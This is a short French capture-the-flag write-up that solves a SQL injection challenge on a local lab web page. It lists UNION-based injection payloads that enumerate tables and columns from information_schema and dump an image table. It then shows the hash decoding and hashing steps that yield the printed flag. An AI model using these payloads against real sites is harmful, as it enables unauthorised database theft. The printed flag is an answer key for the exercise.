Flag 9 - SQL Injection UNION

On se rend à la page : http://192.168.1.47/index.php?page=searchimg


J'ai testé :

1 OR 1=1

On a plusieurs lignes avec Tilte, Url...

<img width="1270" height="882" alt="image" src="https://github.com/user-attachments/assets/462eb94c-6ad3-4bf1-ba0b-4efb664dcd57" />


On utilise maintenant UNION pour lister les tables :

1 OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables


On a bien lister les tables de la bdd.


On va lister la table qui nous interesse : list_images. 

On va interroger information_schema.columns :

1 OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns



Maintenant on connait la table et ses colonnes, on va lire son contenu.

On doit respecter le fait que la page affiche 2 colonnes (Title / Url), donc on renvoie 2 valeurs dans le SELECT.

On va mettre l’id en premier, et un CONCAT de url, title, comment en deuxième :

1 OR 1=1 UNION SELECT id, CONCAT(url, title, comment) FROM list_images

<img width="1698" height="752" alt="image" src="https://github.com/user-attachments/assets/eea41c0c-bf20-41b7-adaa-c7281bd652b6" />


Le message nous dit : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


Ce qui nous indique la marche à suivre pour trouver le flag


On décode le hash MD5 : 

<img width="1426" height="669" alt="image" src="https://github.com/user-attachments/assets/523b0cc7-c333-40f7-b716-8f27362d32a6" />



Enfin pour hasher "albatroz" en SHA256, on utilise :

echo -n "albatroz" | sha256sum


Ce qui nous donne le flag :

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


<img width="486" height="62" alt="image" src="https://github.com/user-attachments/assets/2dee7039-9dd6-44d0-9868-30e009f34a3f" />


